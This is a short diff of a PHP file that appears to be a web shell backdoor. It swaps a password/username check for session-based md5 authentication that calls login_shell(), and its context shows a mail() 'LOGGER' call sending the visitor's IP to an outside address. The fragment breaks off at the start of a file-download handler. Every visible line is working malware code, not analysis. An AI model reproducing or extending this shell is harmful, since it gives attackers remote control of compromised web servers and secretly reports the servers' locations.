@@ -257,12 +257,9 @@ mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]")
 <?php
 exit;
 }
-if(isset($_POST['pass']) && !empty($_POST['pass']) && isset($_POST['username']) && !empty($_POST['username']) ){
-$pass = $_POST['pass'];
-$user = $_POST['username'];
-if($pass > 50){
-die("<center><b><font color='#b0b000'>Maybe you are Drunk O.o...".$warn."</font></b></center>
-    ");
+if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
+    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
     else
         login_shell();
 if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
